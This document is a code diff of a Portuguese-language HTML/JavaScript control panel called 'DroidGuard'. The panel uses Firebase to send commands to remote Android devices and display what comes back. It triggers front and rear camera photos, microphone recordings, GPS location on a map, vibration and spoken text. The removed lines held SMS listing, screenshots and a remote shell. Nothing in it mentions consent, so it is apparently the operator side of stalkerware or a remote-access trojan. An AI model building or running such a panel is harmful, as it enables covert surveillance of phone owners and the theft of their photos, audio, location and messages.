@@ -3,91 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DroidGuard - Painel de Controle</title>
+    <title>DroidGuard - Conectar</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: #0a0c0f; font-family: 'Segoe UI', sans-serif; color: #eef2ff; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { text-align: center; margin-bottom: 30px; }
-        .header h1 { background: linear-gradient(135deg, #2f8e8b, #4fd1c5); -webkit-background-clip: text; background-clip: text; color: transparent; }
-        .card { background: #0f1219; border-radius: 16px; padding: 20px; margin-bottom: 20px; border: 1px solid #1e2a36; }
-        .card h3 { margin-bottom: 15px; border-left: 4px solid #2f8e8b; padding-left: 12px; }
-        button { background: #2f8e8b; border: none; padding: 10px 20px; margin: 5px; border-radius: 8px; color: white; cursor: pointer; transition: 0.2s; }
-        button:hover { transform: scale(1.02); background: #3fa39f; }
-        select, input { background: #1e2a36; border: none; padding: 10px; border-radius: 8px; color: white; margin: 5px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        .card { background: #0f1219; border-radius: 20px; padding: 30px; margin: 20px 0; border: 1px solid #1e2a36; }
+        input { width: 100%; padding: 15px; background: #1e2a36; border: none; border-radius: 10px; color: white; font-size: 16px; margin: 10px 0; }
+        button { background: #2f8e8b; padding: 15px 30px; border: none; border-radius: 10px; color: white; font-size: 16px; cursor: pointer; margin: 5px; }
+        button:hover { background: #3fa39f; }
         .online { color: #2ecc71; }
         .offline { color: #e74c3c; }
-        .result-img { max-width: 100%; border-radius: 8px; margin-top: 10px; max-height: 400px; object-fit: cover; }
-        audio { width: 100%; margin-top: 10px; }
-        pre { background: #1a1f2a; padding: 15px; border-radius: 8px; overflow: auto; max-height: 300px; font-size: 12px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; }
-        .bateria { font-size: 20px; font-weight: bold; }
-        iframe { width: 100%; border-radius: 8px; margin-top: 10px; }
-        .device-selector { background: #0f1219; border-radius: 16px; padding: 20px; margin-bottom: 20px; }
+        .status { padding: 10px; border-radius: 8px; margin: 10px 0; text-align: center; }
+        .conectado { background: #2ecc7120; border: 1px solid #2ecc71; }
+        .desconectado { background: #e74c3c20; border: 1px solid #e74c3c; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin-top: 20px; }
+        .btn-comando { background: #1e2a36; padding: 10px; margin: 5px; }
+        .result-img { max-width: 100%; border-radius: 8px; margin-top: 10px; }
+        pre { background: #1a1f2a; padding: 10px; border-radius: 8px; overflow: auto; font-size: 12px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="header">
+    <div style="text-align: center; margin-bottom: 30px;">
         <h1>🛡️ DroidGuard</h1>
-        <p>Sistema de Monitoramento Remoto</p>
+        <p>Sistema de Monitoramento</p>
     </div>
 
-    <div class="device-selector">
-        <h3>📱 Selecionar Dispositivo</h3>
-        <select id="deviceSelect" onchange="mudarDispositivo()" style="width: 70%;">
-            <option value="">Carregando dispositivos...</option>
-        </select>
-        <button onclick="carregarDispositivos()">🔄 Atualizar</button>
-        <div id="deviceStatus" style="margin-top: 10px;"></div>
+    <!-- TELA DE CONEXÃO -->
+    <div id="telaConexao" class="card">
+        <h2>🔌 Conectar ao Dispositivo</h2>
+        <p>Digite o ID do dispositivo que você quer monitorar:</p>
+        <input type="text" id="inputDeviceId" placeholder="Ex: a1b2c3d4">
+        <button onclick="conectar()">🔗 Conectar</button>
+        <div id="statusConexao"></div>
     </div>
 
-    <div class="grid">
-        <div class="card">
-            <h3>📸 Câmeras</h3>
-            <button onclick="enviarComando('foto_frontal')">📷 Foto Frontal</button>
-            <button onclick="enviarComando('foto_traseria')">📷 Foto Traseira</button>
-            <div id="fotoResultado"></div>
+    <!-- TELA DE CONTROLE (inicialmente escondida) -->
+    <div id="telaControle" style="display:none;">
+        <div class="card conectado" id="infoConexao">
+            <h3>✅ Conectado a: <span id="deviceIdConectado"></span></h3>
+            <div id="deviceStatus">🔍 Verificando status...</div>
+            <button onclick="desconectar()" style="background:#9b2c2c;">🔌 Desconectar</button>
         </div>
 
-        <div class="card">
-            <h3>📱 Controles</h3>
-            <button onclick="enviarComando('bateria')">🔋 Bateria</button>
-            <button onclick="enviarComando('vibrar')">📳 Vibrar</button>
-            <button onclick="enviarComando('gps')">📍 GPS</button>
-            <button onclick="enviarComando('screenshot')">📸 Screenshot</button>
-            <button onclick="abrirFalar()">🗣️ Falar</button>
-            <div id="infoResultado"></div>
-        </div>
+        <div class="grid">
+            <div class="card">
+                <h3>📸 Câmeras</h3>
+                <button class="btn-comando" onclick="enviarComando('foto_frontal')">📷 Foto Frontal</button>
+                <button class="btn-comando" onclick="enviarComando('foto_traseria')">📷 Foto Traseira</button>
+                <div id="fotoResultado"></div>
+            </div>
 
-        <div class="card">
-            <h3>🎤 Áudio</h3>
-            <button onclick="enviarComando('gravar_audio', {duracao:5})">🎙️ 5 segundos</button>
-            <button onclick="enviarComando('gravar_audio', {duracao:10})">🎙️ 10 segundos</button>
-            <button onclick="enviarComando('gravar_audio', {duracao:30})">🎙️ 30 segundos</button>
-            <div id="audioResultado"></div>
-        </div>
+            <div class="card">
+                <h3>📍 Informações</h3>
+                <button class="btn-comando" onclick="enviarComando('bateria')">🔋 Bateria</button>
+                <button class="btn-comando" onclick="enviarComando('gps')">📍 GPS</button>
+                <button class="btn-comando" onclick="enviarComando('vibrar')">📳 Vibrar</button>
+                <button class="btn-comando" onclick="abrirFalar()">🗣️ Falar</button>
+                <div id="infoResultado"></div>
+            </div>
 
-        <div class="card">
-            <h3>📨 Mensagens</h3>
-            <button onclick="enviarComando('listar_sms')">📋 Listar SMS</button>
-            <div id="smsResultado" style="max-height: 300px; overflow: auto;"></div>
-        </div>
-
-        <div class="card">
-            <h3>💻 Shell Remoto</h3>
-            <input type="text" id="shellCmd" placeholder="Comando (ex: ls /sdcard)" style="width: 100%;">
-            <button onclick="executarShell()">Executar</button>
-            <pre id="shellResultado">Aguardando comando...</pre>
+            <div class="card">
+                <h3>🎤 Áudio</h3>
+                <button class="btn-comando" onclick="enviarComando('gravar_audio', {duracao:5})">5 segundos</button>
+                <button class="btn-comando" onclick="enviarComando('gravar_audio', {duracao:10})">10 segundos</button>
+                <div id="audioResultado"></div>
+            </div>
         </div>
     </div>
 </div>
 
 <div id="modalFalar" style="display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#1a1f2a; padding:30px; border-radius:16px; z-index:1000;">
-    <h3>🗣️ Falar no Dispositivo</h3>
-    <input type="text" id="textoFalar" placeholder="Digite o texto..." style="width:100%; margin:10px 0;">
+    <h3>🗣️ Falar</h3>
+    <input type="text" id="textoFalar" style="width:100%; margin:10px 0; padding:10px;">
     <button onclick="enviarComando('falar', {texto: document.getElementById('textoFalar').value}); fecharFalar()">Enviar</button>
     <button onclick="fecharFalar()">Cancelar</button>
 </div>
@@ -97,150 +88,121 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
     
-    let dispositivoAtual = null;
-    let aguardandoResultado = false;
+    let deviceIdConectado = null;
+    let monitorStatus = null;
     
-    function carregarDispositivos() {
-        db.ref('dispositivos').once('value', (snap) => {
-            const devices = snap.val();
-            const select = document.getElementById('deviceSelect');
-            
-            if(devices && Object.keys(devices).length > 0) {
-                select.innerHTML = '<option value="">Selecione um dispositivo...</option>';
-                for(let id in devices) {
-                    const d = devices[id];
-                    const status = d.status === 'online' ? '🟢' : '🔴';
-                    const bateria = d.bateria ? ` - ${d.bateria}%` : '';
-                    select.innerHTML += `<option value="${id}">${status} ${id}${bateria}</option>`;
-                }
-                document.getElementById('deviceStatus').innerHTML = `✅ ${Object.keys(devices).length} dispositivo(s) encontrado(s)`;
+    function conectar() {
+        const deviceId = document.getElementById('inputDeviceId').value.trim();
+        if(!deviceId) {
+            alert('Digite um ID de dispositivo!');
+            return;
+        }
+        
+        deviceIdConectado = deviceId;
+        
+        // Verificar se o dispositivo existe
+        db.ref(`dispositivos/${deviceIdConectado}`).once('value', (snap) => {
+            const device = snap.val();
+            if(device && device.status === 'online') {
+                document.getElementById('statusConexao').innerHTML = '<div class="status conectado">✅ Conectado com sucesso!</div>';
+                document.getElementById('telaConexao').style.display = 'none';
+                document.getElementById('telaControle').style.display = 'block';
+                document.getElementById('deviceIdConectado').innerHTML = deviceIdConectado;
+                
+                // Monitorar status do dispositivo
+                if(monitorStatus) monitorStatus.off();
+                monitorStatus = db.ref(`dispositivos/${deviceIdConectado}`).on('value', (snap) => {
+                    const d = snap.val();
+                    if(d) {
+                        const statusHtml = d.status === 'online' 
+                            ? '<span class="online">🟢 Online</span>'
+                            : '<span class="offline">🔴 Offline</span>';
+                        document.getElementById('deviceStatus').innerHTML = `Status: ${statusHtml} | 🔋 Bateria: ${d.bateria || '?'}%`;
+                    } else {
+                        document.getElementById('deviceStatus').innerHTML = '<span class="offline">⚠️ Dispositivo não encontrado</span>';
+                    }
+                });
             } else {
-                select.innerHTML = '<option value="">Nenhum dispositivo online</option>';
-                document.getElementById('deviceStatus').innerHTML = '❌ Nenhum dispositivo encontrado. Verifique se o bot está rodando.';
+                document.getElementById('statusConexao').innerHTML = '<div class="status desconectado">❌ Dispositivo offline ou não existe!</div>';
+                deviceIdConectado = null;
             }
-        }).catch(err => {
-            console.error(err);
-            document.getElementById('deviceStatus').innerHTML = '❌ Erro ao conectar ao Firebase';
         });
     }
     
-    function mudarDispositivo() {
-        dispositivoAtual = document.getElementById('deviceSelect').value;
-        if(dispositivoAtual) {
-            document.getElementById('deviceStatus').innerHTML = `✅ Conectado a: <strong>${dispositivoAtual}</strong> <span class="online">● Online</span>`;
-            
-            // Monitorar bateria em tempo real
-            db.ref(`dispositivos/${dispositivoAtual}`).on('value', (snap) => {
-                const d = snap.val();
-                if(d && d.bateria !== undefined) {
-                    document.getElementById('deviceStatus').innerHTML = `✅ Conectado a: <strong>${dispositivoAtual}</strong> <span class="online">● Online</span> | 🔋 Bateria: ${d.bateria}%`;
-                }
-            });
-        }
+    function desconectar() {
+        if(monitorStatus) monitorStatus.off();
+        deviceIdConectado = null;
+        document.getElementById('telaControle').style.display = 'none';
+        document.getElementById('telaConexao').style.display = 'block';
+        document.getElementById('inputDeviceId').value = '';
+        document.getElementById('statusConexao').innerHTML = '';
     }
     
     async function enviarComando(acao, params = {}) {
-        if(!dispositivoAtual) {
-            alert('Selecione um dispositivo primeiro!');
+        if(!deviceIdConectado) {
+            alert('Conecte a um dispositivo primeiro!');
             return;
         }
         
         const cmdId = Date.now().toString();
         
-        // Mostrar loading na área correspondente
-        const areas = {
+        // Mostrar loading
+        const areaMap = {
             'foto_frontal': 'fotoResultado',
             'foto_traseria': 'fotoResultado',
-            'screenshot': 'fotoResultado',
             'bateria': 'infoResultado',
             'gps': 'infoResultado',
             'vibrar': 'infoResultado',
-            'gravar_audio': 'audioResultado',
-            'listar_sms': 'smsResultado',
-            'shell': 'shellResultado',
-            'falar': 'infoResultado'
+            'falar': 'infoResultado',
+            'gravar_audio': 'audioResultado'
         };
-        
-        const areaId = areas[acao] || 'infoResultado';
-        document.getElementById(areaId).innerHTML = '<div style="color: #2f8e8b;">⏳ Enviando comando... Aguardando resposta</div>';
+        const areaId = areaMap[acao] || 'infoResultado';
+        document.getElementById(areaId).innerHTML = '⏳ Enviando comando...';
         
         try {
-            await db.ref(`comandos/${dispositivoAtual}/${cmdId}`).set({ 
+            // Enviar comando SOMENTE para o ID específico
+            await db.ref(`comandos/${deviceIdConectado}/${cmdId}`).set({ 
                 acao: acao, 
-                params: params, 
+                params: params,
+                target_id: deviceIdConectado,
                 timestamp: Date.now() 
             });
             
-            const resultRef = db.ref(`resultados/${dispositivoAtual}/${cmdId}`);
+            // Aguardar resultado (até 15 segundos)
+            const resultRef = db.ref(`resultados/${deviceIdConectado}/${cmdId}`);
             
             resultRef.once('value', (snap) => {
                 const resultado = snap.val();
-                
                 if(resultado) {
                     if(resultado.foto) {
                         document.getElementById('fotoResultado').innerHTML = `<img src="data:image/jpeg;base64,${resultado.foto}" class="result-img">`;
-                    } 
-                    else if(resultado.screen) {
-                        document.getElementById('fotoResultado').innerHTML = `<img src="data:image/png;base64,${resultado.screen}" class="result-img">`;
-                    }
-                    else if(resultado.audio) {
+                    } else if(resultado.latitude) {
+                        document.getElementById('infoResultado').innerHTML = `
+                            📍 Lat: ${resultado.latitude}<br>
+                            📍 Lng: ${resultado.longitude}<br>
+                            <iframe width="100%" height="200" src="https://maps.google.com/maps?q=${resultado.latitude},${resultado.longitude}&output=embed"></iframe>
+                        `;
+                    } else if(resultado.percentage !== undefined) {
+                        document.getElementById('infoResultado').innerHTML = `🔋 Bateria: ${resultado.percentage}%`;
+                    } else if(resultado.audio) {
                         document.getElementById('audioResultado').innerHTML = `<audio controls src="data:audio/aac;base64,${resultado.audio}"></audio>`;
-                    }
-                    else if(resultado.latitude) {
-                        document.getElementById('infoResultado').innerHTML = `
-                            <p>📍 Latitude: ${resultado.latitude}</p>
-                            <p>📍 Longitude: ${resultado.longitude}</p>
-                            <iframe width="100%" height="250" frameborder="0" 
-                                src="https://maps.google.com/maps?q=${resultado.latitude},${resultado.longitude}&output=embed"></iframe>
-                        `;
-                    }
-                    else if(resultado.sms) {
-                        let html = '';
-                        resultado.sms.forEach(s => {
-                            html += `<p><strong>📱 ${s.numero}</strong><br>${s.texto}<br><small>${s.data || ''}</small></p><hr>`;
-                        });
-                        document.getElementById('smsResultado').innerHTML = html;
-                    }
-                    else if(resultado.percentage !== undefined) {
-                        document.getElementById('infoResultado').innerHTML = `
-                            <div class="bateria">🔋 Bateria: ${resultado.percentage}%</div>
-                        `;
-                    }
-                    else if(resultado.stdout !== undefined) {
-                        document.getElementById('shellResultado').innerHTML = `<pre>${resultado.stdout || resultado.stderr || 'Comando executado'}</pre>`;
-                    }
-                    else {
+                    } else {
                         document.getElementById(areaId).innerHTML = `<pre>${JSON.stringify(resultado, null, 2)}</pre>`;
                     }
                 } else {
-                    document.getElementById(areaId).innerHTML = '⏳ Nenhuma resposta recebida...';
+                    document.getElementById(areaId).innerHTML = '⏳ Aguardando resposta do dispositivo...';
                 }
             });
             
-            setTimeout(() => {
-                resultRef.off();
-                const currentContent = document.getElementById(areaId).innerHTML;
-                if(currentContent.includes('Aguardando') || currentContent.includes('Enviando')) {
-                    document.getElementById(areaId).innerHTML = '⏰ Timeout: O dispositivo não respondeu. Verifique se o bot está rodando.';
-                }
-            }, 20000);
+            setTimeout(() => resultRef.off(), 15000);
             
         } catch(e) {
             document.getElementById(areaId).innerHTML = `❌ Erro: ${e.message}`;
         }
     }
     
-    function executarShell() {
-        const cmd = document.getElementById('shellCmd').value;
-        if(cmd) enviarComando('shell', { cmd: cmd });
-    }
-    
     function abrirFalar() { document.getElementById('modalFalar').style.display = 'block'; }
     function fecharFalar() { document.getElementById('modalFalar').style.display = 'none'; }
-    
-    // Inicializar
-    carregarDispositivos();
-    setInterval(carregarDispositivos, 10000);
 </script>
 </body>
 </html>
